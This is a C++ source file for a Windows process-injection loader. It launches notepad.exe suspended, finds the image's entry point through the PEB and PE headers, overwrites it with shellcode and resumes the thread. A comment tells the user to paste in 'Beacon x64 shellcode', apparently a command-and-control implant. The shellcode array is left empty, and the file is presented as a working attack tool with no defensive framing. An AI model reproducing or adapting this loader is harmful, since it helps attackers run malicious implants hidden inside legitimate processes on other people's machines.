// Compile with MinGW:
// x86_64-w64-mingw32-g++ aepinjection.cpp -o injector.exe -lntdll -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc

#include <windows.h>
#include <winternl.h>
#include <stdio.h>

#pragma comment(lib, "ntdll")

int main() {    
	STARTUPINFOA si;
	si = {};
	PROCESS_INFORMATION pi = {};
	PROCESS_BASIC_INFORMATION pbi = {};
	DWORD returnLength = 0;
	CreateProcessA(0, (LPSTR)"c:\\windows\\system32\\notepad.exe", 0, 0, 0, CREATE_SUSPENDED, 0, 0, &si, &pi);

        // get target image PEB address and pointer to image base
	NtQueryInformationProcess(pi.hProcess, ProcessBasicInformation, &pbi, sizeof(PROCESS_BASIC_INFORMATION), &returnLength);
	DWORD_PTR pebOffset = (DWORD_PTR)pbi.PebBaseAddress + 0x10;

        // get target process image base address
	LPVOID imageBase = 0;
	ReadProcessMemory(pi.hProcess, (LPCVOID)pebOffset, &imageBase, sizeof(LPVOID), NULL);

        // read target process image headers
	BYTE headersBuffer[4096] = {};
	ReadProcessMemory(pi.hProcess, (LPCVOID)imageBase, headersBuffer, 4096, NULL);

        // get AddressOfEntryPoint
	PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)headersBuffer;
	PIMAGE_NT_HEADERS ntHeader = (PIMAGE_NT_HEADERS)((DWORD_PTR)headersBuffer + dosHeader->e_lfanew);
	LPVOID codeEntry = (LPVOID)(ntHeader->OptionalHeader.AddressOfEntryPoint + (DWORD_PTR)imageBase);

        // Do something with the AddressOfEntryPoint(print to console in this case)
	printf("%02X\n", codeEntry);

        // Paste Beacon x64 shellcode here either in {0x00, 0x00} OR "\0x00\0x00" format
	unsigned char shellcode[] = ;

        // write shellcode to image entry point and execute it
	WriteProcessMemory(pi.hProcess, codeEntry, shellcode, sizeof(shellcode), NULL);
    
        printf("Press any key to resume thread!\n");
	getchar();

	// Resume the thread
	ResumeThread(pi.hThread);


	return 0;
}
